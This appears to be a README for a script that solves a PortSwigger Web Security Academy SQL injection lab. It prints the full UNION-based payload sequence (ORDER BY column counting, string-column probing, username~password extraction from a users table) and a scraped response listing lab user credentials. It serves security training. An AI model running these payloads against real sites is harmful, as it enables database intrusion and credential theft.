# 🔐 SQL injection UNION attack, retrieving multiple values in a single column

This script is designed to test for basic SQL injection vulnerabilities in labs from PortSwigger's Web Security Academy Lab: [SSQL injection UNION attack, retrieving multiple values in a single column](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-retrieving-multiple-values-within-a-single-column/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column#). It targets endpoints like `/filter?category=` and checks whether a given payload successfully bypasses input validation.

---

## 🚀 How It Works

The script performs the following steps:

1. **Disables SSL warnings** to avoid certificate issues with lab URLs.
2. **Sets up a proxy** (default: `127.0.0.1:8080`) for interception via tools like Burp Suite.
3. **Accepts two arguments**:
   - `url`: The base URL of the lab.
   - `table`: Name of a separate table that needs be used during UNION SQL Injection.
   - `columns`: A list of columns can be passed by the user separated by space.
4. **Constructs the full request URL** by appending the payload to `/filter?category=`.
5. **Sends the request** and use beautiful soup library to fetch the password for administrator
6. **Prints the result** indicating whether the injection was successful.

---

## 🧪 Sample Usage

```bash
python3 unionRetrieveMultiValueInSingleColumn.py https://0aa800a003a881d480aa0dd20061002f.web-security-academy.net users username password
```

### ✅ Sample Output

```
(+) Targeting: https://0aa800a003a881d480aa0dd20061002f.web-security-academy.net
(+) Determining number of columns using ORDER BY...

    ➤ Testing payload: ' ORDER BY 1--
    ➤ Testing payload: ' ORDER BY 2--
    ➤ Testing payload: ' ORDER BY 3--

(✓) Found error at column 3, so total columns = 2

(+) Testing which of 2 columns accepts string data...

    ➤ Testing payload: ' UNION SELECT 'test123',null--
    ✗ Column 1 caused an error. Trying next...

    ➤ Testing payload: ' UNION SELECT null,'test123'--

(✓) Column 2 accepts string data.

(+) Attempting to extract data from table 'users'...

    ➤ Final payload: ' UNION SELECT null, username || '~' || password FROM users--

(✓) Administrator credentials found:

    ➤ Username: administrator
    ➤ Password: voif5hady7oywwwt6twd
```

---

## 📌 Lab-Specific Note

For this particular lab, the script checks whether the response contains the administrator password in a particular html tag using web scraping to determine success. You can modify this logic in the code to match other labs or contexts.

---

## 📦 Requirements

Install dependencies using:

```bash
pip install -r requirements.txt
```

---

## 📦 Walkthrough of the code
[Code Walkthrough](https://medium.com/@adhithyasivanesh/portswigger-web-security-academy-labs-sqli-lab-1-retrieving-hidden-data-fe40ea356d5d)

## Sample HTML response which was scrapped

```HTML
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session=d4DbcIvc5dotUTVqJl5yt2x1lGxy1gb8; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 4310

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>SQL injection UNION attack, retrieving multiple values in a single column</title>
    </head>
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>SQL injection UNION attack, retrieving multiple values in a single column</h2>
                            <a id='lab-link' class='button' href='/'>Back to lab home</a>
                            <a class=link-back href='https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="ecoms-pageheader">
                        <img src="/resources/images/shop.svg">
                    </section>
                    <section class="ecoms-pageheader">
                        <h1>Gifts&apos; UNION SELECT null, username || &apos;~&apos; || password FROM users--</h1>
                    </section>
                    <section class="search-filters">
                        <label>Refine your search:</label>
                        <a class="filter-category" href="/">All</a>
                        <a class="filter-category" href="/filter?category=Accessories">Accessories</a>
                        <a class="filter-category" href="/filter?category=Clothing%2c+shoes+and+accessories">Clothing, shoes and accessories</a>
                        <a class="filter-category" href="/filter?category=Lifestyle">Lifestyle</a>
                        <a class="filter-category" href="/filter?category=Pets">Pets</a>
                        <a class="filter-category" href="/filter?category=Tech+gifts">Tech gifts</a>
                    </section>
                    <table class="is-table-list">
                        <tbody>
                        <tr>
                            <th>wiener~0g163eearebih36pgn65</th>
                        </tr>
                        <tr>
                            <th>carlos~k0fwfkvx0npqfftawr40</th>
                        </tr>
                        <tr>
                            <th>administrator~voif5hady7oywwwt6twd</th>
                        </tr>
                        </tbody>
                    </table>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```